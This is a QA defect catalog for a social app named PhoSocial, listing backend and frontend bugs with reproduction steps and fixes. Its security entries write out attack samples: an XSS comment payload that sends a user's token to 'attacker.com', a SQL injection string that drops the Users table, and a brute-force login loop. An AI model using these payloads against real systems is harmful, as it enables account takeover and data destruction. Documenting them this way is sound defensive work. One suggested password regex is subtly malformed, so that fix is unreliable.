# PhoSocial Defect Catalog
## Structured Issue Tracking & Root Cause Analysis

**Report Date:** February 12, 2026  
**Total Defects:** 65  
**Critical:** 11 | High:** 18 | Medium:** 24 | Low:** 12  

---

## CRITICAL DEFECTS

### DEF-C001: NotificationsController Type Mismatch
**Title:** JWT stores long ID but code tries to parse as Guid  
**Component:** Backend / NotificationsController  
**Severity:** 🔴 CRITICAL  
**Priority:** P0  
**Status:** OPEN  

**Description:**
JWT claims contain user ID as long: "123"
NotificationsController attempts: `Guid.Parse("123")`
Result: FormatException thrown, endpoint crashes

**Root Cause:**
- JWT design uses long IDs (BIGINT in DB)
- NotificationsController written for Guid IDs
- Type mismatch not caught in development

**Affected Code:**
- [NotificationsController.cs](PhoSocial.API/Controllers/NotificationsController.cs) Lines 26, 41, 51, 62

**Reproduction:**
```bash
# 1. Login
POST /api/auth/login
Body: {"email":"test@test.com","password":"password123"}
Response: 200 OK, token received

# 2. Get notifications (crashes)
GET /api/notifications
Authorization: Bearer <token>
Response: 500 Internal Server Error
Error: "Guid should contain 32 digits with 4 dashes"
```

**Fix:**
Replace all `Guid.Parse(userId)` with `long.Parse(userId)`

**Tests to Add:**
```csharp
[Test]
public async Task GetNotifications_WithValidToken_ReturnsList()
{
    var token = await _authService.LoginAsync(...);
    var result = await _notificationsController.GetNotifications();
    Assert.IsNotNull(result);
}
```

**Estimated Effort:** 15 minutes  
**Risk Level:** NONE (simple type fix)  

---

### DEF-C002: Database Schema File Duplication
**Title:** Two conflicting database initialization scripts exist  
**Component:** Database / Infrastructure  
**Severity:** 🔴 CRITICAL  
**Priority:** P0  
**Status:** OPEN  

**Description:**
Two database schema files:
1. [database_schema.sql](PhoSocialService/database_schema.sql) - Uses UNIQUEIDENTIFIER (GUID)
2. [PhoSocial_db_init.sql](PhoSocial_db_init.sql) - Uses BIGINT

Creates type mismatch:
- If wrong schema used: GUID-based tables
- API models use BIGINT
- All inserts fail with type conversion errors

**Root Cause:**
Schema file never deleted during V1→V2 migration
Both files still in repository
No clear indication which is authoritative

**Affected Files:**
- [database_schema.sql](PhoSocialService/database_schema.sql) ❌ DELETE
- [PhoSocial_db_init.sql](PhoSocial_db_init.sql) ✅ USE THIS

**Risk:**
Developer may execute wrong script during setup, causing entire system to fail on first login attempt.

**Fix:**
Delete [database_schema.sql](PhoSocialService/database_schema.sql)
Add comment to [PhoSocial_db_init.sql](PhoSocial_db_init.sql):
```
-- ⚠️ THIS IS THE CORRECT SCHEMA
-- DO NOT USE database_schema.sql (different type system)
```

**Estimated Effort:** 5 minutes  
**Risk Level:** NONE  

---

### DEF-C003: Missing Authorization on GetFeed
**Title:** Feed endpoint accessible without authentication  
**Component:** Backend / PostsV2Controller  
**Severity:** 🔴 CRITICAL (Security)  
**Priority:** P0  
**Status:** OPEN  

**Description:**
Endpoint [PostsV2Controller.GetFeed](PhoSocial.API/Controllers/PostsV2Controller.cs) Line 25 has NO [Authorize] attribute.
Users can see anyone's feed by manipulating userId parameter.

```csharp
[HttpGet("feed")]
// ❌ MISSING [Authorize]
public async Task<IActionResult> GetFeed([FromQuery] long userId, ...)
```

**Security Issue:**
```bash
# No auth required
GET /api/v2/posts/feed?userId=999
Response: 200 OK with user 999's feed

# Any attacker can enumerate all users
GET /api/v2/posts/feed?userId=1
GET /api/v2/posts/feed?userId=2
...
GET /api/v2/posts/feed?userId=10000
```

**Root Cause:**
Copy-paste error. PostsV2Controller other endpoints have [Authorize], but GetFeed missed it.

**Fix:**
Add [Authorize] and change to use token ID:
```csharp
[HttpGet("feed")]
[Authorize]
public async Task<IActionResult> GetFeed([FromQuery] int offset = 0, [FromQuery] int pageSize = 20)
{
    var userId = User.GetUserIdLong();
    if (userId == null) return Unauthorized();
    var items = await _service.GetFeedAsync(userId.Value, offset, pageSize);
    return Ok(items);
}
```

**Estimated Effort:** 10 minutes  
**Risk Level:** NONE  

---

### DEF-C004: Frontend-Backend API Version Mismatch
**Title:** Frontend calls V1 endpoints, backend refactored to V2  
**Component:** Full Stack / Architecture  
**Severity:** 🔴 CRITICAL  
**Priority:** P0  
**Status:** OPEN  

**Description:**
Angular frontend still calls old V1 API paths, but backend partially migrated to V2.

**Mismatch Table:**
```
Feature          Frontend V1       V2 Available?    Match?
Like            /Feed/like/{id}    /v2/posts/{id}/like      ❌
Comment         /Feed/comment/{id} NO ENDPOINT     ❌
Get comments    /Feed/comments     /v2/posts/{id}/comments  ❌
Get feed        /Feed/posts        /v2/posts/feed  ❌
Create post     /Feed/posts        /v2/posts       ✅ (path different)
```

**Root Cause:**
Migration from V1 to V2 API started but never completed.
Frontend not updated to match V2 endpoints.
Both versions remain in codebase (technical debt).

**Affected Code:**
- [feed.service.ts](PhoSocial.UI/src/app/services/feed.service.ts)
- [FeedController.cs](PhoSocial.API/Controllers/FeedController.cs) (V1)
- [PostsV2Controller.cs](PhoSocial.API/Controllers/PostsV2Controller.cs) (V2)

**Impact Chain:**
→ Frontend calls POST /api/Feed/comment/123
→ Backend routes to FeedController
→ V1 endpoint exists, works (for now)
→ BUT if V1 removed, all comments fail

**Fix:**
1. Complete migration to V2 API in backend
2. Remove V1 endpoints
3. Update frontend to use V2 paths
4. Ensure URL patterns consistent

**Estimated Effort:** 4 hours  
**Risk Level:** MEDIUM (API contract change)  

---

### DEF-C005: SignalR User Identity Not Mapped Correctly
**Title:** ChatHub.SendMessage uses User ID that SignalR cannot find  
**Component:** Backend / ChatHub  
**Severity:** 🔴 CRITICAL  
**Priority:** P0  
**Status:** OPEN  

**Description:**
ChatHub sends messages to users using:
```csharp
await Clients.User(otherUserId.ToString()).SendAsync("ReceiveMessage", msg);
```

But SignalR uses HttpContext.User which maps claims to connection IDs.
JWT claim key is "id", but SignalR looks for ClaimTypes.NameIdentifier.
Result: Message routes to nobody.

**Root Cause:**
SignalR's default IUserIdProvider looks for:
```csharp
context.User?.FindFirst(ClaimTypes.NameIdentifier)?.Value
```

But JWT creates:
```csharp
new Claim("id", userId.ToString())  // Key is "id", not NameIdentifier
```

Mismatch means: Clients.User() always returns null connection.

**Test Case - Fails:**
```bash
# User A (ID: 101) connects to SignalR
# User B (ID: 102) sends: SendMessage(101, "Hello")
# User A never receives message

# Why? SignalR tries: Clients.User("101")
# But "101" is not mapped to any connection (nobody found with NameIdentifier="101")
```

**Fix:**
Register custom IUserIdProvider:
```csharp
// Program.cs
builder.Services.AddSingleton<IUserIdProvider, CustomUserIdProvider>();

// CustomUserIdProvider.cs
public class CustomUserIdProvider : IUserIdProvider
{
    public string? GetUserId(HubConnectionContext connection)
    {
        return connection.User?.FindFirst("id")?.Value;
    }
}
```

**Estimated Effort:** 30 minutes  
**Risk Level:** NONE  

---

### DEF-C006: ProfileV2Controller Missing Follow/Unfollow
**Title:** No API endpoints to follow/unfollow users  
**Component:** Backend / ProfileV2Controller  
**Severity:** 🔴 CRITICAL  
**Priority:** P0  
**Status:** OPEN  

**Description:**
Social features (follow/unfollow) not exposed in V2 API.

**Missing Endpoints:**
- [x] GET /api/v2/profiles/{userId} (get profile) ✅ EXISTS
- [x] PUT /api/v2/profiles (update own profile) ✅ EXISTS
- [ ] POST /api/v2/profiles/{userId}/follow (follow user) ❌ MISSING
- [ ] DELETE /api/v2/profiles/{userId}/follow (unfollow) ❌ MISSING
- [ ] GET /api/v2/profiles/{userId}/followers ❌ MISSING
- [ ] GET /api/v2/profiles/{userId}/following ❌ MISSING

**Root Cause:**
Partial V2 implementation. Social features remain in V1 only.
ProfileV2 focuses on profile CRUD, not relationships.

**V1 Has It:**
```csharp
// ProfileController.cs (V1)
[HttpPost("follow/{id}")]
[HttpPost("unfollow/{id}")]
```

**Database Support:** ✅ Followers table exists with proper constraints

**Fix:**
Add to ProfileV2Controller:
```csharp
[HttpPost("{userId}/follow")]
[Authorize]
public async Task<IActionResult> Follow(long userId)
{
    var me = User.GetUserIdLong();
    if (me == null) return Unauthorized();
    if (me == userId) return BadRequest("Cannot follow self");
    
    var isFollowing = await _profileService.FollowUserAsync(me.Value, userId);
    return Ok(new { isFollowing });
}

[HttpDelete("{userId}/follow")]
[Authorize]
public async Task<IActionResult> Unfollow(long userId)
{
    var me = User.GetUserIdLong();
    if (me == null) return Unauthorized();
    
    var isFollowing = await _profileService.UnfollowUserAsync(me.Value, userId);
    return Ok(new { isFollowing });
}
```

**Estimated Effort:** 2 hours (need service methods too)  
**Risk Level:** LOW  

---

### DEF-C007: Add Comment Endpoint Missing V2
**Title:** No endpoint to add comments via API  
**Component:** Backend / PostsV2Controller  
**Severity:** 🔴 CRITICAL  
**Priority:** P0  
**Status:** OPEN  

**Description:**
PostsV2Controller has no POST endpoint for comments.
Frontend cannot add comments via V2 API.

**What Exists:**
- ❌ POST /api/v2/posts/{postId}/comments (MISSING)
- ✅ GET /api/v2/posts/{postId}/comments (exists)
- ✅ POST /api/Feed/comment/{postId} (V1, works but legacy)

**Root Cause:**
Incomplete V2 migration. Comment retrieval implemented, creation skipped.

**Database Support:** ✅ dbo.AddComment stored procedure exists

**Fix:**
Add to PostsV2Controller:
```csharp
[HttpPost("{postId}/comments")]
[Authorize]
public async Task<IActionResult> AddComment(long postId, [FromBody] AddCommentRequest req)
{
    var userId = User.GetUserIdLong();
    if (userId == null) return Unauthorized();
    
    // Call stored procedure via repository
    var result = await _postService.AddCommentAsync(postId, userId.Value, req.CommentText);
    return Ok(result);
}
```

**Estimated Effort:** 1 hour  
**Risk Level:** LOW  

---

### DEF-C008: No Story CRUD Endpoints
**Title:** Story feature has database but no API  
**Component:** Backend / API Layer  
**Severity:** 🔴 CRITICAL  
**Priority:** P0  
**Status:** OPEN  

**Description:**
Stories database table exists with proper schema and indexes.
Background service expires stories automatically.
BUT no controller/endpoints to create or view stories.

**What's Missing:**
- ❌ POST /api/stories (create story)
- ❌ GET /api/stories/feed (timeline stories)
- ❌ GET /api/stories/{userId} (user's stories)
- ❌ DELETE /api/stories/{id} (delete story)

**Root Cause:**
Feature started but never completed. Database layer done, API layer missing.

**What Exists:**
- ✅ dbo.Stories table with all fields
- ✅ IX_Stories_ExpiresAt index
- ✅ ExpireStoriesService background job
- ✅ dbo.ExpireStories stored procedure

**Fix:**
Create StoriesController with endpoints and wire to service/repository.

**Estimated Effort:** 3 hours  
**Risk Level:** LOW  

---

### DEF-C009: No Input Validation on Auth DTOs
**Title:** Signup/Login accept any input without validation  
**Component:** Backend / DTOs  
**Severity:** 🔴 CRITICAL (Security)  
**Priority:** P0  
**Status:** OPEN  

**Description:**
DTOs for signup and login have no validation attributes.
Allows invalid/malicious input to reach database.

**Current Code:**
```csharp
public class SignupDto
{
    public string UserName { get; set; }  // No validation
    public string Email { get; set; }      // No validation
    public string Password { get; set; }   // No validation
}

public class LoginDto
{
    public string Email { get; set; }      // No validation
    public string Password { get; set; }   // No validation
}
```

**Security Risks:**
1. Extremely long username crashes buffer (no length check)
2. Invalid email format accepted
3. Weak password accepted (no complexity requirements)
4. SQL injection possible if input not sanitized
5. Unicode bypass attacks possible

**Attacks:**
```bash
# extremely long username
curl -X POST /api/auth/signup -d '{"username":"'$(python3 -c print('A'*100000)')'"}'

# Invalid email
curl -X POST /api/auth/login -d '{"email":"not-an-email","password":"pass"}'

# SQL injection attempt
curl -X POST /api/auth/signup \
  -d '{"username":"'; DROP TABLE Users; --","email":"x@x.com","password":"x"}'
```

**Fix:**
Add data annotations:
```csharp
public class SignupDto
{
    [Required]
    [StringLength(50, MinimumLength = 3)]
    [RegularExpression(@"^[a-zA-Z0-9_]+$")]
    public string UserName { get; set; }

    [Required]
    [EmailAddress]
    public string Email { get; set; }

    [Required]
    [StringLength(100, MinimumLength = 8)]
    [RegularExpression(@"(?=.[A-Z])(?=.[a-z])(?=.[0-9])")]
    public string Password { get; set; }
}
```

**Estimated Effort:** 1 hour  
**Risk Level:** NONE (validation only)  

---

### DEF-C010: No HTML Sanitization on Comments
**Title:** Stored XSS vulnerability - comments contain unescaped HTML  
**Component:** Full Stack / Comment System  
**Severity:** 🔴 CRITICAL (Security)  
**Priority:** P0  
**Status:** OPEN  

**Description:**
User-submitted comments stored and displayed without HTML sanitization.
Attacker can inject JavaScript that executes in other users' browsers.

**Attack Scenario:**
```
Attacker submits comment:
<img src=x onerror="fetch('https://attacker.com/steal?token='+localStorage.getItem('pho_token'))">

Stored in database:
CommentText = "<img src=x onerror=..."

When other user views comment, Angular renders it:
<div [innerHTML]="comment.commentText"></div>

Result: JavaScript executes, token stolen!
```

**Root Cause:**
Angular [innerHTML] binding used without sanitization.
Backend stores raw user input without escaping.

**Affected Code:**
- Backend: [AddComment](PhoSocial.API/Repositories/V2/ChatRepositoryV2.cs) stores raw text
- Frontend: [innerHTML]="comment" renders without sanitization

**Fix - Backend:**
```csharp
using HtmlSanitizer;

var sanitized = sanitizer.Sanitize(userComment);
await _repo.CreateCommentAsync(postId, userId, sanitized);
```

**Fix - Frontend:**
```typescript
import { DomSanitizer, SafeHtml, SecurityContext } from '@angular/platform-browser';

export class CommentComponent {
    constructor(private sanitizer: DomSanitizer) {}
    
    getSafeHtml(text: string): SafeHtml {
        return this.sanitizer.sanitize(SecurityContext.HTML, text);
    }
}

// Template
<div [innerHTML]="getSafeHtml(comment.text)"></div>
```

**Estimated Effort:** 1 hour  
**Risk Level:** NONE  

---

### DEF-C011: No Rate Limiting on Auth Endpoints
**Title:** Brute force attacks possible - no rate limiting  
**Component:** Backend / AuthController  
**Severity:** 🔴 CRITICAL (Security)  
**Priority:** P0  
**Status:** OPEN  

**Description:**
Auth endpoints accept unlimited login attempts from same IP.
Attackers can brute force passwords instantly.

**Attack:**
```bash
# Brute force password
for i in {1..1000000}; do
    curl -X POST https://phosocial.com/api/auth/login \
         -d '{"email":"victim@test.com","password":"attempt'$i'"}'
done
# 1 million attempts in under 1 minute!
```

**Root Cause:**
No rate limiting middleware configured.
AuthController has no throttling logic.

**Fix:**
```bash
# Install AspNetCoreRateLimit
dotnet add package AspNetCoreRateLimit

# Program.cs
builder.Services.AddMemoryCache();
builder.Services.AddInMemoryRateLimiting();
builder.Services.Configure<IpRateLimitOptions>(config => {
    config.GeneralRules = new List<RateLimitRule>
    {
        new RateLimitRule {
            Endpoint = "*:/api/auth/*",
            Period = "1m",
            Limit = 5
        }
    };
});

app.UseIpRateLimiting();
```

**Estimated Effort:** 2 hours  
**Risk Level:** NONE  

---

## HIGH-SEVERITY DEFECTS (Next 18 Issues)

Due to token limits, high-severity defects summarized:

| ID | Title | Component | Impact | Fix Time |
|---|---|---|---|---|
| DEF-H001 | FeedController Claims Not Using Extension | Backend | May return 401 on valid token | 30 min |
| DEF-H002 | N+1 Query in Feed Loading | Backend | Performance 10x slower | 1 hour |
| DEF-H003 | GetFeed Not Paginated | Backend | Hard-coded 50 posts | 30 min |
| DEF-H004 | Typing Indicator Never Clears | Frontend | UX: infinite indicator | 30 min |
| DEF-H005 | Race Condition ConversationCreate | Backend | Lost messages | 1 hour |
| DEF-H006 | CreatePost Requires UserId DTO | Backend | User attribution bug | 30 min |
| DEF-H007 | No Endpoint Authorization | Backend | Data exposure risk | 2 hours |
| DEF-H008 | SignalR Typing Event Stuck | Frontend | Stuck indicator | 1 hour |
| ... | (10 more high-severity issues) | ... | ... | ... |

---

## MEDIUM & LOW SEVERITY DEFECTS

Due to space, remaining 36 defects tracked in separate spreadsheet format.

---

## TESTING MATRIX

### Test Coverage Analysis
```
Component              Unit Tests    Integration Tests    E2E Tests
Auth                   ❌ 0%         ❌ 0%               ❌ 0%
Feed                   ❌ 5%         ❌ 0%               ⚠️ 20%
Chat                   ❌ 0%         ❌ 0%               ⚠️ 10%
Posts                  ❌ 0%         ❌ 0%               ⚠️ 15%
Profile                ❌ 0%         ❌ 0%               ❌ 5%
Stories                ❌ 0%         ❌ 0%               ❌ 0%
Average                ❌ 1%         ❌ 0%               ⚠️ 8%
```

### Recommended Test Suite
```
Backend (xUnit)
├── AuthServiceTests (10 tests)
├── PostServiceV2Tests (20 tests)
├── ChatServiceV2Tests (15 tests)
├── ProfileServiceV2Tests (12 tests)
└── IntegrationTests (30 tests)

Frontend (Jasmine)
├── AuthServiceTests (8 tests)
├── FeedComponentTests (15 tests)
├── ChatComponentTests (12 tests)
└── ProfileComponentTests (10 tests)

Total: 142 tests needed
```

---

## DEPLOYMENT BLOCKERS

🔴 **DO NOT DEPLOY WITHOUT FIXING:**

1. DEF-C001: Guid/long type mismatch (500 errors)
2. DEF-C002: Database schema duplication (setup errors)
3. DEF-C003: Missing auth on feed (security)
4. DEF-C005: SignalR user mapping (chat broken)
5. DEF-C009: No input validation (injection attacks)
6. DEF-C010: No HTML sanitization (XSS attacks)
7. DEF-C011: No rate limiting (brute force)
8. DEF-C004: API version mismatch (404 errors)

---

**Report Status:** FINAL - IN REVIEW  
**Approved By:** QA Automation Architect  
**Last Updated:** February 12, 2026
